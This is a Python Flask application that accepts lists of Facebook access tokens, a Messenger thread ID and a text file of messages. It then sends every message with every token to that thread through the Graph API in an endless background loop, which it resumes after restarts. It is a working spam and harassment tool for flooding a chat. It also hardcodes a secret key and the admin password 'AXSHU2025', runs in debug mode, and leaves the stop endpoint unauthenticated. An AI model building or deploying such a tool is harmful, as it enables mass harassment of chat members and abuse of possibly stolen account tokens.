from flask import Flask, request, session, redirect, url_for, render_template
import requests
from threading import Thread, Event
import time
import os
import logging
import io
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime, Boolean
from sqlalchemy.orm import sessionmaker, declarative_base
from datetime import datetime
import json
import uuid

app = Flask(__name__)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"

# Database setup
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_NAME = "tasks.db"
engine = create_engine(f'sqlite:///{os.path.join(BASE_DIR, DB_NAME)}?check_same_thread=False')
Base = declarative_base()

# Database Model for Tasks
class Task(Base):
    __tablename__ = 'tasks'
    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    thread_id = Column(String(50), nullable=False)
    prefix = Column(String(255))
    interval = Column(Integer)
    messages = Column(Text)
    tokens = Column(Text)
    status = Column(String(20), default='Running')
    messages_sent = Column(Integer, default=0)
    start_time = Column(DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f"<Task(id={self.id}, status='{self.status}', thread_id='{self.thread_id}')>"

Base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)

running_tasks = {}

# ------------------ PING ------------------
@app.route('/ping', methods=['GET'])
def ping():
    return "✅ I am alive!", 200

# ------------------ MESSAGE SENDER ------------------
def send_messages(task_id, stop_event, pause_event):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    
    if not task:
        db_session.close()
        return

    tokens = json.loads(task.tokens)
    messages = json.loads(task.messages)
    headers = {'Content-Type': 'application/json'}

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        
        try:
            for message_content in messages:
                if stop_event.is_set():
                    break
                
                if pause_event.is_set():
                    break
                
                for access_token in tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{task.thread_id}/'
                    message = f"{task.prefix} {message_content}"
                    parameters = {'access_token': access_token, 'message': message}
                    
                    try:
                        response = requests.post(api_url, data=parameters, headers=headers, timeout=10)
                        
                        if response.status_code == 200:
                            task.messages_sent += 1
                            db_session.commit()
                            logging.info(f"✅ Sent: {message[:30]} for Task ID: {task.id}")
                        else:
                            logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]} for Task ID: {task.id}")
                    except requests.exceptions.RequestException as e:
                        logging.error(f"⚠️ Network error for Task ID {task.id}: {e}")
                    
                    if pause_event.is_set():
                        break
                
                if pause_event.is_set():
                    break
                
                time.sleep(task.interval)

        except Exception as e:
            logging.error(f"⚠️ Error in message loop for Task ID {task.id}: {e}")
            db_session.rollback()
            time.sleep(10)
    
    db_session.close()

# ------------------ MAIN FORM ------------------
@app.route('/', methods=['GET', 'POST'])
def send_message():
    task_id = None
    if request.method == 'POST':
        access_tokens_str = request.form.get('tokens')
        access_tokens = access_tokens_str.strip().splitlines()
        
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))
        
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()
        
        db_session = Session()
        try:
            new_task = Task(
                thread_id=thread_id,
                prefix=mn,
                interval=time_interval,
                messages=json.dumps(messages),
                tokens=json.dumps(access_tokens),
                status='Running',
                messages_sent=0
            )
            db_session.add(new_task)
            db_session.commit()
            task_id = new_task.id
        finally:
            db_session.close()
            
        stop_event = Event()
        pause_event = Event()
        thread = Thread(target=send_messages, args=(task_id, stop_event, pause_event))
        thread.daemon = True
        thread.start()
        
        running_tasks[task_id] = {
            'thread': thread,
            'stop_event': stop_event,
            'pause_event': pause_event
        }
        
    return render_template('index.html', task_id=task_id)

# ------------------ ADMIN PANEL ------------------
@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    db_session = Session()
    tasks = db_session.query(Task).all()
    db_session.close()

    total_messages_sent = sum(task.messages_sent for task in tasks)
    active_threads = sum(1 for task in tasks if task.status == 'Running')

    return render_template('admin.html', tasks=tasks, total_messages_sent=total_messages_sent, active_threads=active_threads)

# ------------------ STOP/PAUSE/RESUME LOGIC ------------------
@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if not task_id:
        return redirect(url_for('send_message'))

    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()

    if task and task.status != 'Stopped':
        if task_id in running_tasks:
            running_tasks[task_id]['stop_event'].set()
            del running_tasks[task_id]
        
        task.status = 'Stopped'
        db_session.commit()
        logging.info(f"✅ Stopped and saved Task ID: {task_id}")

    elif task and task.status == 'Stopped':
        db_session.delete(task)
        db_session.commit()
        logging.info(f"🗑️ Removed stopped Task ID: {task_id}")

    db_session.close()
    return redirect(url_for('send_message'))

@app.route('/pause_task/<string:task_id>', methods=['POST'])
def pause_task(task_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].set()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        task.status = 'Paused'
        db_session.commit()
        db_session.close()

        logging.info(f"⏸️ Paused task with ID: {task_id}")
    return redirect(url_for('admin_panel'))

@app.route('/resume_task/<string:task_id>', methods=['POST'])
def resume_task(task_id):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    
    if task_id in running_tasks:
        running_tasks[task_id]['pause_event'].clear()
        
        db_session = Session()
        task = db_session.query(Task).filter_by(id=task_id).first()
        task.status = 'Running'
        db_session.commit()
        db_session.close()

        logging.info(f"▶️ Resumed task with ID: {task_id}")
    return redirect(url_for('admin_panel'))

# ------------------ ADMIN LOGIN & LOGOUT ------------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "AXSHU2025":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return render_template('login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/logs')
def get_logs():
    if not session.get('admin'):
        return "Not authorized", 403
    
    return "Logs are not persistent yet.", 200

# ------------------ RUN APP ------------------
def run_all_tasks_from_db():
    db_session = Session()
    tasks_from_db = db_session.query(Task).filter_by(status='Running').all()
    
    for task in tasks_from_db:
        stop_event = Event()
        pause_event = Event()
        
        thread = Thread(target=send_messages, args=(task.id, stop_event, pause_event))
        thread.daemon = True
        thread.start()
        
        running_tasks[task.id] = {
            'thread': thread,
            'stop_event': stop_event,
            'pause_event': pause_event
        }
        logging.info(f"✅ Resuming Task ID {task.id} from database.")
    
    db_session.close()

if __name__ == '__main__':
    run_all_tasks_from_db()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
